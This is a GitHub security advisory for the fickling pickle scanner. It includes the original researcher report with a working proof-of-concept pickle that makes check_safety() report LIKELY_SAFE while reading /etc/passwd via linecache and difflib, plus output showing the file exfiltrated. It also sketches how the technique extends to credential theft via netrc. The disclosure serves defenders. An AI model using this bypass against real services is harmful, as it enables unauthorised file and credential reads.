# [M] fickling modules linecache, difflib and gc are missing from the unsafe modules blocklist

## Summary
Severity: Medium
Advisory: GHSA-r48f-3986-4f9c
CWE: CWE-184
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N (CVSS_V4)
Published: 2026-03-13
Source: https://github.com/advisories/GHSA-r48f-3986-4f9c
Type: github-advisory

## Affected
- PyPI: `fickling` — affected >=0 <0.1.10

## Details
# Our analysis

As stated in the [project's security policy](https://github.com/trailofbits/fickling/security/policy), we also don't consider `UnusedVariables` bypasses to be security issues. We added several unsafe modules mentioned by the reporter in advisory comments to the blocklist (https://github.com/trailofbits/fickling/commit/7f39d97258217ee2c21a1f5031d4a6d7343eb30d). 

# Original report

Title: UnusedVariables analysis bypass via BUILD opcode Arbitrary File Read through fickling.load()

### Summary
Two independent bugs in fickling's AST-based static analysis combine to allow a malicious pickle file to execute arbitrary stdlib function calls - including reading sensitive files - while check_safety() returns Severity.LIKELY_SAFE and fickling.load() completes without raising UnsafeFileError.

A server using fickling.load() as a security gate before deserializing untrusted pickle data (its documented use case) is fully bypassed. The attacker receives the contents of any file readable by the server process as the return value of fickling.load().

### Details
Interpreter.unused_assignments() does not scan the result assignment's RHS

File: fickling/fickle.py, Interpreter.unused_assignments(), ~line 1242

```python
for statement in self.module_body:
    if isinstance(statement, ast.Assign):
        if (
            len(statement.targets) == 1
            and isinstance(statement.targets[0], ast.Name)
            and statement.targets[0].id == "result"
        ):
            break
        ...
        statement = statement.value
    if statement is not None:
        for node in ast.walk(statement):
            if isinstance(node, ast.Name):
                used.add(node.id)
```

When the loop reaches result = _varN, it breaks immediately. The right-hand side of the result assignment is never walked for variable references. Any variable whose only reference is inside the result expression is therefore never added to the used set and is incorrectly flagged as unused - unless it also appears in an earlier non-assignment statement.

The BUILD opcode generates exactly such a non-assignment statement:

```python
# Build.run() generates:
_var4 = _var3                     # Assign  - _var3 added to used
_var4.__setstate__(_var2)         # Expr    - _var2 and _var4 added to used
```

This makes _var2 (the result of the dangerous call) appear in the used set via the __setstate__ expression, so UnusedVariables never flags it.

File: fickling/fickle.py, TupleThree.run(), and siblings

```python
def run(self, interpreter: Interpreter):
    top = interpreter.stack.pop()
    mid = interpreter.stack.pop()
    bot = interpreter.stack.pop()
    interpreter.stack.append(ast.Tuple((bot, mid, top), ast.Load()))
    #                                   ^^^^^^^^^^^^^^^^
    #                                   Python tuple, not list
```

Python's ast module requires repeated fields (such as Tuple.elts) to be lists. When elts is a Python tuple, ast.iter_child_nodes() does not yield its elements, so ast.walk() never descends into them. Any variable reference stored inside such a tuple node is invisible to every analysis that uses ast.walk() - including UnusedVariables.

Demo:

```python
import ast
name = ast.Name(id='_var1', ctx=ast.Load())

# Correct (list elts) - ast.walk finds it
t = ast.Tuple(elts=[name], ctx=ast.Load())
print([n.id for n in ast.walk(t) if isinstance(n, ast.Name)])  # ['_var1']

# Buggy (tuple elts) - ast.walk finds nothing
t = ast.Tuple(elts=(name,), ctx=ast.Load())
print([n.id for n in ast.walk(t) if isinstance(n, ast.Name)])  # []
```

#### Combined attack - arbitrary file read

The two bugs combine with the absence of `linecache` and `difflib` from `UNSAFE_IMPORTS`:
```
from linecache import getlines      # not in UNSAFE_IMPORTS
_var0 = getlines('/etc/passwd')     # reads the file
from builtins import enumerate
_var1 = enumerate(_var0)            # _var0 in RHS - added to used
from builtins import dict
_var2 = dict(_var1)                 # _var1 in RHS - added to used; produces {0:'line1',...}
from difflib import Differ
_var3 = Differ()                    # stdlib, not in UNSAFE_IMPORTS
_var4 = _var3
_var4.__setstate__(_var2)           # BUILD Expr - _var2 and _var4 added to used
result = _var3                      # loop breaks here; nothing in defined−used
```

check_safety() returns Severity.LIKELY_SAFE. fickling.load() calls pickle.loads(). At runtime, Differ().__dict__.update({0: 'root:x:0:0\n', ...}) succeeds and the file contents are returned to the caller.

### PoC
`pip install fickling`

```python
#!/usr/bin/env python3
import io
import sys

import fickling.fickle as op
from fickling.fickle import Pickled
from fickling.analysis import check_safety, Severity
from fickling.loader import load
from fickling.exception import UnsafeFileError

TARGET = "/etc/passwd"

pickled = Pickled([
    op.Proto.create(4),

    op.ShortBinUnicode("linecache"),
    op.ShortBinUnicode("getlines"),
    op.StackGlobal(),
    op.ShortBinUnicode(TARGET),
    op.TupleOne(),
    op.Reduce(),
    op.Memoize(),                   # memo[0] = _var0 = getlines(TARGET)

    op.Global("builtins enumerate"),
    op.BinGet(0),
    op.TupleOne(),
    op.Reduce(),
    op.Memoize(),                   # memo[1] = _var1 = enumerate(_var0)

    op.Global("builtins dict"),
    op.BinGet(1),
    op.TupleOne(),
    op.Reduce(),
    op.Memoize(),                   # memo[2] = _var2 = dict(_var1)

    op.ShortBinUnicode("difflib"),
    op.ShortBinUnicode("Differ"),
    op.StackGlobal(),
    op.EmptyTuple(),
    op.Reduce(),
    op.Memoize(),                   # memo[3] = _var3 = Differ()

    op.BinGet(2),                   # push _var2 as BUILD state
    op.Build(),                     # _var4=_var3; _var4.__setstate__(_var2)

    op.BinGet(3),
    op.Stop(),
])

result = check_safety(pickled)
assert result.severity == Severity.LIKELY_SAFE, f"Expected LIKELY_SAFE, got {result.severity}"
print(f"[+] check_safety verdict : {result.severity.name}  (bypass confirmed)")

buf = io.BytesIO()
pickled.dump(buf)

obj = load(io.BytesIO(buf.getvalue()))
lines = {k: v for k, v in obj.__dict__.items() if isinstance(k, int)}

print(f"[+] fickling.load() returned : {type(obj).__name__}")
print(f"[+] {TARGET} - {len(lines)} lines exfiltrated:\n")
for i in sorted(lines):
    print(f"{lines[i]}", end="")
```

### Result

```
[+] check_safety verdict : LIKELY_SAFE  (bypass confirmed)
[+] fickling.load() returned : Differ
[+] /etc/passwd - 58 lines exfiltrated:

    root:x:0:0:root:/root:/usr/bin/zsh
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
    dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
    systemd-timesync:x:992:992:systemd Time Synchronization:/:/usr/sbin/nologin

```

### Impact
Vulnerability type: Static analysis bypass leading to arbitrary file read (and arbitrary stdlib code execution) through a security-gated deserialization API.

Who is impacted: Any application or service that calls fickling.load() or fickling.loads() to validate untrusted pickle data before deserializing it. This is the primary documented use case of the fickling.loader module. The attacker supplies a pickle file; the server processes it through fickling.load(), receives LIKELY_SAFE, and unpickles the payload. File contents are returned directly in the deserialized object's attributes.

Beyond file read, the same BUILD-opcode technique can be applied to any stdlib module absent from UNSAFE_IMPORTS (e.g., gc.get_objects() for full in-process memory inspection, inspect.stack() for call-frame local variable exfiltration, netrc.netrc() for credential theft).

## References
- https://github.com/trailofbits/fickling/security/advisories/GHSA-r48f-3986-4f9c
- https://github.com/trailofbits/fickling/commit/7f39d97258217ee2c21a1f5031d4a6d7343eb30d
- https://github.com/trailofbits/fickling
- https://github.com/trailofbits/fickling/releases/tag/v0.1.10
